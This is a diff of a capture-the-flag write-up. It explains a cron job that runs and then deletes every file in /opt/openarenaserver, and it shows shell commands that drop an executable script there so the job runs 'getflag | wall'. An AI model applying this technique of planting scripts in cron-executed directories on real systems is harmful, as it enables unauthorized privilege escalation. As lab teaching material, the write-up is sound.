@@ -10,8 +10,12 @@ for i in /opt/openarenaserver/* ; do
 done
 ```
 This script finds all the files found in `/opt/openarenaserver/*`, executes them, and removes them.
+
+We will craft a script to exploit this vulnerability.
+Our aim is for the cron job to run the getflag command and then broadcast the output to all users' terminals, meaning our terminal, using the wall command.
+
 ```shell
-echo '#!/bin/sh' > /opt/openarenaserver/lol.sh
-echo 'getflag | wall' >> /opt/openarenaserver/lol.sh
-chmod +x /opt/openarenaserver/lol.sh
+echo '#!/bin/sh' > /opt/openarenaserver/exploit.sh
+echo 'getflag | wall' >> /opt/openarenaserver/exploit.sh
+chmod +x /opt/openarenaserver/exploit.sh
 ```
